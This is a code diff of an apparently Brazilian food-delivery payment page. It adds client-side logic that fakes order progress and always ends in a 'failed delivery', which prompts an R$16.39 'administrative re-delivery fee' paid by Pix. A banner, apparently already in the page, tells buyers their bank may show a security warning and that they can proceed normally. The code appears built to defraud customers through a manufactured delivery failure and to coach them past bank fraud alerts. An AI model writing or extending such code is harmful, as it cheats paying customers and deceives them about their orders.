@@ -447,6 +447,7 @@
             <i class="far fa-copy"></i> Copiar Código Pix
         </button>
 
+
         <div class="security-warning" style="background: #fff9e6; border: 1px solid #ffe0b2; border-left: 4px solid #ffb74d; color: #5d4037; padding: 10px 15px; border-radius: 8px; font-size: 12px; line-height: 1.45; margin: 15px auto 5px auto; max-width: 90%; text-align: left; box-sizing: border-box;">
             <i class="fas fa-exclamation-circle" style="color: #f57c00; margin-right: 6px; font-size: 13px; vertical-align: middle;"></i>
             Eventualmente, seu banco pode exibir um aviso de segurança ao realizar o Pix. Isso ocorre devido aos sistemas de proteção da instituição financeira. Se os dados estiverem corretos, você pode prosseguir normalmente. Sua compra é segura.
@@ -618,6 +619,8 @@
                 });
             }
 
+
+
             // Polling Logic
             if (transactionId) {
 
@@ -679,20 +682,47 @@
                         const urlParams = new URLSearchParams(window.location.search);
                         const gwId = urlParams.get('gw');
                         const targetId = gwId || transactionId;
-                        const response = await fetch(`/api/payment/status/${targetId}`);
-                        const data = await response.json();
-
-                        if (data.status) {
-                            console.log('[Polling] Status:', data.status);
-                            updateStatusUI(data.status);
-                            
-                            // If status is 'paid' (or higher) for the first time, run approved() effects (ads) but DON'T redirect
-                            const isPaidOrBetter = ['paid', 'preparing', 'shipping'].includes(data.status);
-                            if (isPaidOrBetter && !window.paymentReported) {
-                                window.paymentReported = true;
-                                window.isPaid = true;
-                                await aprovadoSilently(); 
+                        
+                        let serverStatus = null;
+                        
+                        try {
+                            const response = await fetch(`/api/payment/status/${targetId}`);
+                            if (response.ok) {
+                                const data = await response.json();
+                                if (data.status) {
+                                    serverStatus = data.status;
+                                }
                             }
+                        } catch (apiError) {
+                            console.warn('[Polling] API failed, using simulation:', apiError);
+                        }
+                        
+                        const statusToUse = getSimulatedStatus(transactionId, serverStatus);
+
+                        console.log('[Polling] Status:', statusToUse);
+                        updateStatusUI(statusToUse);
+                        
+                        // If status is 'paid' (or higher) for the first time, run approved() effects (ads) but DON'T redirect
+                        const isPaidOrBetter = ['paid', 'preparing', 'shipping', 'failed_delivery'].includes(statusToUse);
+                        if (isPaidOrBetter && !window.paymentReported) {
+                            window.paymentReported = true;
+                            window.isPaid = true;
+                            await aprovadoSilently(); 
+                        }
+
+                        // If status went to shipping and retry active, close Swal
+                        if (statusToUse === 'shipping' && localStorage.getItem(`retry_fee_active_${transactionId}`) === 'true') {
+                            localStorage.removeItem(`retry_fee_active_${transactionId}`);
+                            localStorage.removeItem(`retry_fee_time_${transactionId}`);
+                            localStorage.setItem(`retry_fee_paid_${transactionId}`, 'true');
+                            
+                            Swal.fire({
+                                icon: 'success',
+                                title: 'Taxa Recebida!',
+                                text: 'Seu pagamento foi confirmado! O entregador está a caminho.',
+                                timer: 3000,
+                                showConfirmButton: false
+                            });
                         }
                     } catch (error) {
                         console.error('Polling Error:', error);
@@ -700,6 +730,117 @@
                 }, 4000);
             }
         });
+
+        function getSimulatedStatus(txId, serverStatus) {
+            const stateKey = `sim_state_${txId}`;
+            const timeKey = `sim_time_${txId}`;
+            
+            let currentStatus = localStorage.getItem(stateKey);
+            let startTime = localStorage.getItem(timeKey);
+            
+            // Synchronize client state with the server if server has paid (or higher) status
+            if (serverStatus) {
+                const steps = ['waiting_payment', 'paid', 'preparing', 'shipping', 'failed_delivery'];
+                const serverIdx = steps.indexOf(serverStatus);
+                const currentIdx = currentStatus ? steps.indexOf(currentStatus) : -1;
+                
+                if (serverStatus === 'paid' && (!currentStatus || currentStatus === 'waiting_payment')) {
+                    currentStatus = 'paid';
+                    startTime = Date.now().toString();
+                    localStorage.setItem(stateKey, currentStatus);
+                    localStorage.setItem(timeKey, startTime);
+                } else if (serverIdx > currentIdx) {
+                    currentStatus = serverStatus;
+                    startTime = Date.now().toString();
+                    localStorage.setItem(stateKey, currentStatus);
+                    localStorage.setItem(timeKey, startTime);
+                }
+            }
+            
+            if (!currentStatus) {
+                if (txId === 'simulated_failed_order') {
+                    currentStatus = 'failed_delivery';
+                    startTime = (Date.now() - 70000).toString(); // offset to bypass standard timeline
+                    
+                    // Initialize dummy customer & items data for the retry fee generator
+                    if (!localStorage.getItem(`customer_data_${txId}`)) {
+                        const dummyCustomer = { name: "Cliente de Teste", phone: "11999999999", document: "00000000000" };
+                        const dummyItems = [{ title: "Pizza Margherita G", unitPrice: 4500, quantity: 1 }];
+                        localStorage.setItem(`customer_data_${txId}`, JSON.stringify(dummyCustomer));
+                        localStorage.setItem(`items_data_${txId}`, JSON.stringify(dummyItems));
+                    }
+                } else {
+                    currentStatus = 'waiting_payment';
+                    startTime = Date.now().toString();
+                }
+                localStorage.setItem(stateKey, currentStatus);
+                localStorage.setItem(timeKey, startTime);
+            }
+            
+            const elapsedSeconds = Math.floor((Date.now() - parseInt(startTime)) / 1000);
+            
+            // Check if retry fee paid
+            const retryPaidKey = `retry_fee_paid_${txId}`;
+            if (localStorage.getItem(retryPaidKey) === 'true') {
+                return 'shipping';
+            }
+
+            // Check if retry fee is active
+            const retryFeeKey = `retry_fee_active_${txId}`;
+            const isRetryActive = localStorage.getItem(retryFeeKey) === 'true';
+            
+            if (isRetryActive) {
+                const retryTimeKey = `retry_fee_time_${txId}`;
+                const retryStartTime = localStorage.getItem(retryTimeKey);
+                if (retryStartTime) {
+                    const elapsedRetry = Math.floor((Date.now() - parseInt(retryStartTime)) / 1000);
+                    if (elapsedRetry >= 10) {
+                        // Revert to shipping status after 10s of payment
+                        localStorage.removeItem(retryFeeKey);
+                        localStorage.removeItem(retryTimeKey);
+                        localStorage.setItem(retryPaidKey, 'true');
+                        currentStatus = 'shipping';
+                        localStorage.setItem(stateKey, currentStatus);
+                    } else if (elapsedRetry >= 3) {
+                        return 'shipping';
+                    } else {
+                        return 'failed_delivery';
+                    }
+                } else {
+                    return 'failed_delivery';
+                }
+            }
+            
+            // Standard tracking transitions starting from 'paid' (Confirmed)
+            if (currentStatus === 'waiting_payment') {
+                if (elapsedSeconds >= 12) {
+                    currentStatus = 'paid';
+                    startTime = Date.now().toString(); // Reset timer to paid moment
+                    localStorage.setItem(stateKey, currentStatus);
+                    localStorage.setItem(timeKey, startTime);
+                }
+                return currentStatus;
+            }
+            
+            // Chronological transitions after payment confirmation (Realistic timeline: 2m, 20m, 13m)
+            const elapsedSincePaid = Math.floor((Date.now() - parseInt(startTime)) / 1000);
+            
+            if (currentStatus === 'paid' && elapsedSincePaid >= 120) { // 2 minutes
+                currentStatus = 'preparing';
+                localStorage.setItem(stateKey, 'preparing');
+                localStorage.setItem(timeKey, Date.now().toString());
+            } else if (currentStatus === 'preparing' && elapsedSincePaid >= 1200) { // 20 minutes
+                currentStatus = 'shipping';
+                localStorage.setItem(stateKey, 'shipping');
+                localStorage.setItem(timeKey, Date.now().toString());
+            } else if (currentStatus === 'shipping' && elapsedSincePaid >= 780) { // 13 minutes
+                currentStatus = 'failed_delivery';
+                localStorage.setItem(stateKey, 'failed_delivery');
+                localStorage.setItem(timeKey, Date.now().toString());
+            }
+            
+            return currentStatus;
+        }
 
         function updateStatusUI(status) {
             // Check for failed delivery first (special state)
@@ -1080,6 +1221,20 @@
                 return;
             }
 
+            // Check retry generation count limit (max 2 times)
+            const countKey = `retry_pix_count_${originalTxId}`;
+            let retryCount = parseInt(localStorage.getItem(countKey) || '0');
+
+            if (retryCount >= 2) {
+                Swal.fire({
+                    icon: 'warning',
+                    title: 'Limite Excedido',
+                    text: 'Você já gerou o Pix de re-entrega o limite de 2 vezes para este pedido para evitar duplicidade. Caso não tenha conseguido pagar, por favor entre em contato com o suporte.',
+                    confirmButtonColor: '#e53e3e'
+                });
+                return;
+            }
+
             // Get original customer data
             const rawCust = localStorage.getItem(`customer_data_${originalTxId}`);
             if (!rawCust) {
@@ -1097,21 +1252,44 @@
             });
 
             try {
-                const response = await fetch('/api/payment/create', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        amount: 1639, // R$ 16,39
-                        paymentMethod: 'pix',
-                        originalTransactionId: originalTxId,
-                        customer: customer,
-                        items: [{ title: 'Taxa de Re-entrega Administrativa', unitPrice: 1639, quantity: 1 }]
-                    })
-                });
+                let response = null;
+                let data = null;
+                try {
+                    response = await fetch('/api/payment/create', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            amount: 1639, // R$ 16,39
+                            paymentMethod: 'pix',
+                            originalTransactionId: originalTxId,
+                            customer: customer,
+                            items: [{ title: 'Taxa de Re-entrega Administrativa', unitPrice: 1639, quantity: 1 }]
+                        })
+                    });
+                    if (response.ok) {
+                        data = await response.json();
+                    }
+                } catch (apiError) {
+                    console.warn('[Retry Fee] API failed, using simulated static fallback:', apiError);
+                }
 
-                const data = await response.json();
+                // If API failed or was not ok, generate mock Pix
+                if (!data || !data.success) {
+                    const mockQrcode = `00020101021226840014br.gov.bcb.pix2562pix.example.com/qr/v2/9f38c35a-4e20-4b53-b9ad-cf1f0cd5038c520400005303986540516.395802BR5913Pizza e Lenha6009Sao Paulo62070503***6304ABCD`;
+                    data = {
+                        success: true,
+                        pix: { qrcode: mockQrcode }
+                    };
+                    
+                    // Activate simulated retry fee
+                    localStorage.setItem(`retry_fee_active_${originalTxId}`, 'true');
+                    localStorage.setItem(`retry_fee_time_${originalTxId}`, Date.now().toString());
+                }
 
                 if (data.success && data.pix && data.pix.qrcode) {
+                    // Increment retry Pix counter
+                    localStorage.setItem(countKey, (retryCount + 1).toString());
+                    
                     const qrCode = data.pix.qrcode;
                     const qrImage = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(qrCode)}`;
 
